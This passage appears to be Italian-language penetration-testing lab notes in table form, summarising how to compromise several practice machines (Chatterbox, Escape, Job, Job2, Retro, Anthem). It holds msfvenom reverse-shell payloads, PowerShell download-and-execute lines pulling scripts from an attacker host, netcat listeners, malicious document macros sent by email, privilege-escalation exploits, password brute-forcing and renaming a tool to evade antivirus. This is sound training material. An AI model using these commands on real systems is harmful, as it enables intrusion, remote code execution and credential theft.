| **Reverse shell** | 1.`msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c IEX(New-Object net.webclient).downloadstring('http://IP_KALI:80/Invoke-PowerShellTCP.ps1')" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python`<br>2. `wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1`<br>3. `python3 -m http.server 80`<br>4. `nc -lvnp 4444`<br>5. *ULTIMA RIGA:* `Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444`<br>6. `python3 36025.py` | Modifichiamo l'IP su cui fare richiesta ed il comando `msfvenom` *1.* al suo interno in modo da avere una reverse shell Scarichiamo la reverse Shell *2.* powershell ed inseriamo al suo interno la riga *5.* ed avviamo il file *6.*          |
| **AutoLogon**     | 1. `wget https://raw.githubusercontent.com/lucky-luk3/ActiveDirectory/refs/heads/master/PowerUp.ps1`<br>2. *TARGET:* `IEX(New-Object Net.WebClient).downloadstring('http://IP_KALI:80/PowerUp.ps1')`<br>3. *TARGET:* `Invoke All-Checks`<br>4. *TARGET:* `$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force`<br>5. *TARGET:* `$cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)`<br>6. *TARGET:* `Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://IP_KALI:80/Invole-PowerShellTCP.ps1')" -Credential $cred`                                                                                                                                                                                                                                                                                                                                                                                                                            | Utilizziamo `PowerUp.ps1` per identificare la vulnerabilit√† *3.*. Troviamo che ha delle credenziali salvate durante l'accesso (AutoLogon). Salviamo con *4* e *5.* le credenziali in una variabile e poi avviamo con la *6.* una reverse shell |


- [writeup](https://rootsecdev.medium.com/htb-chatterbox-writeup-5c15dd3756e1)

### Escape

| üß† **Azione**             | üíª **Comando / Metodo**                                                                                                           | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ------------------------- | --------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **RDP withouth password** | 1. `xfreerdp3 /v:IP_TARGET /sec:nla`<br>2. ![[Pasted image 20250719180555.png]]                                                   | E' attiva solo la porta `3389` su cui √® presente il servizio *RDP*. Utilizzando la *1.* possiamo tentare l'accesso tramite GUI dove troviamo scritto                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| **Credentials**           |                                                                                                                                   | Sul file `C:\Users\_admin\profiles.xml` troviamo le credenziali dell'utente `_admin` utilizzate dal servizio *Remote Desktop Plus*. Proviamo ad eseguire il file `C:\Program Files 86\Remote Desktop Plus` ed importiamo `profiles.xml` per vedere le credenziali in chiaro; purtroppo vengono coperte dai bullet (pallini).<br>Scarichiamo sulla macchina target [Kernel Password Unmask](https://www.nucleustechnologies.com/Unmask-Password-Show-Reveal-Stars.html) un tool che permette di mettere in chiaro le credenziali bullettate (pallini). Cambiamogli il nome dell'eseguibile in `msedge` cos√¨ da non essere rilevato dall'antivirus ed avviamolo. In seguito avviamo anche `Remote Desktop Plus` e vedremo le credenziali in chiaro. |
| **Administrator**         | 1. `runas /user:admin cmd`<br>2. `whoami /groups \| findstr /i "Administrators"`<br>3. `Start-Process powershell -Verb runAs`<br> | Una volta ottenuta la password utilizziamo la *1.* per avviare una shell. Con la *2.* notiamo che l'utente attuale √® inserito nel gruppo Administrator quindi possiamo usare la *3.* per diventare root                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |


- [writeup](https://arz101.medium.com/vulnlab-escape-3d2599df95e0)


### Job

| üß† **Azione**     | üíª **Comando / Metodo**                                                                                                                                                                                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SMTP**          | 1. ![[Pasted image 20250719211751.png]]<br>2. ![[Pasted image 20250719211957.png]]<br>3. `sendemail -s job.local -f "daz <daz@daz.daz>" -t career@job.local -o tls=no -m "Please see the attached for my cover letter. \n\nV/R.,\n\nDaZ Smith" -a CV.odt`<br> | Dalla pagina principale riceviamo un suggerimento nell'inviare un file `.odt`. Poich√© la porta `25` √® aperta possiamo provare a creare un file con una MACRO dentro che avvii una reverse shell.<br>Scarichiamo sulla host locale [Libre Office Writer](https://it.libreoffice.org/download/download/) ed apriamolo. Inseriamo un testo e poi andiamo su Tools > Macros > Organize Macros > Macro. Inseriamo una reverse shell come nella *1.*. Dopo Andiamo su Tools > Customize > OpenDocument > Events ed inseriamo la macro appena creata come nella *2.*. Infine con la *3.* inviamo il file tramite email. Ricordiamoci di tenere una porta in ascolto |
| **Web**           | 1. `msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f aspx LHOST=IP_KALI LPORT=9002 > rev.aspx`<br>2. `curl http://IP_KALI:9005/rev.aspx`                                                                                                                    | Sul path `C:\inetpub\wwwroot` troviamo la webroot. Creiamo una reverse shell con la *1.* e con la *2.* scarichiamola sulla macchina target.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| **Reverse shell** | 1. `msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=IP_KALI LPORT=9003 > reverse.exe`<br>2. `.\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a 'C:\temp\reverse.exe' -e EfsRpc`                                  | Adesso siamo passati ad un altro utente aventi privilegi `SeImpersonatePrivilege`. Carichiamo sulla macchina target una reverse shell generata con la *1.* e il tool [Sweet Potato](https://github.com/CCob/SweetPotato). Utilizziamo la *2.* per avviare la reverse shell e diventare root                                                                                                                                                                                                                                                                                                                                                                  |


- [writeup](https://dan-feliciano.com/2024/07/14/job/)

### Job2

| üß† **Azione** | üíª **Comando / Metodo**                                                                                                                                                                                                                 | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| ------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SMTP**      | 1. <br>![[Pasted image 20250720152415.png]]<br>2. ![[Pasted image 20250719211957.png]]<br>3. `sendemail -s job2.vl -f "puck <puck@vulnlab.com>" -t hr@job2.vl -o tls=no -m "hey pls check my cv http://IP_KALI/test" -a puck3.docm`<br> | Dalla pagina principale riceviamo un suggerimento nell'inviare un file `.odt`. Poich√© la porta `25` √® aperta possiamo provare a creare un file con una MACRO dentro che avvii una reverse shell.<br>Scarichiamo sulla host locale [Libre Office Writer](https://it.libreoffice.org/download/download/) ed apriamolo. Inseriamo un testo e poi andiamo su Tools > Macros > Organize Macros > Macro. Inseriamo una reverse shell come nella *1.*. Dopo Andiamo su Tools > Customize > OpenDocument > Events ed inseriamo la macro appena creata come nella *2.*. Infine con la *3.* inviamo il file tramite email. Ricordiamoci di tenere una porta in ascolto |
| **winrm**     | 1. `crackmapexec winrm IP_TARGET -u Ferdinand -p /usr/share/wordlists/rockyou.txt`                                                                                                                                                      | Con un bruteforce otteniamo le credenziali dell'utente                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **Veeam**     | 1. `nestat -ano`<br>2. `.\VeeamHax.exe --target 127.0.0.1 --cmd C:\temp\reverse.exe`                                                                                                                                                    | Con la *1.* vediamo che √® aperta la porta `9401` dove gira il servizio *Veeam* che √® vulnerabile a [RCE](https://github.com/puckiestyle/CVE-2023-27532-RCE-Only). Adesso siamo root                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |

- [writeup](https://www.puckiestyle.nl/vulnlab-job2/)

### Retro

| üß† **Azione**           | üíª **Comando / Metodo**                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                          |
| ----------------------- | -------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Fuzzing Directories** | 1. `krdc rdp://IP_TARGET`<br>                                                    | Con il fuzzing directories trovo il path `/retro` dove trovo le credenziali `wade:parzival`. Utilizziamo la *1.* per entrare tramite *RDP*                                                                                                     |
| **Windows 10.0.14393**  | 1. `Invoke-WebRequest http://IP_KALI/CVE.exe -OutFile CVE.exe`<br>2. `.\CVE.exe` | Googlando troviamo questo [privesc](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213). Lo scarichiamo sulla kali e lo passiamo tramite powrshell con la *1.*. Infine eseguiamola con la *2.* per diventare amministratori |

- [writeup](https://medium.com/@shunsuiky0raku/tryhackme-retro-walkthrough-241f04736bc5)

### Anthem

| üß† **Azione**    | üíª **Comando / Metodo**              | üìù **Output / Scopo**                                                                                                                                                                                                                                                        |
| ---------------- | ------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **robots**       |                                      | Troviamo che il file `/robots.txt` dov'√® presente una password.                                                                                                                                                                                                              |
| **Poem**         | 1. `rdesktop DOMAIN -u USER -p PASS` | In una delle pagine √® presente un poema che googlando scopriamo che √® del poeta `SG`. Utilizziamo la *1.* per collegarci tramite servizio *RDP*                                                                                                                              |
| **Hidden Files** |                                      | Controllando con la *1.* i file nascosti presenti sul percorso `C:\` troviamo la cartella `/backup` dov'√® presente un file. Aprendo il file dalla GUI e CLICK DESTRO=>SECURITY=>EDIT=>ADD inseriamo l'utente `SG` possiamo aprirlo e trovare la password dell'amministratore |

- [writeup](https://medium.com/@jamesjarviscyber/anthem-tryhackme-full-write-up-walkthrough-summary-28054f93c8cf)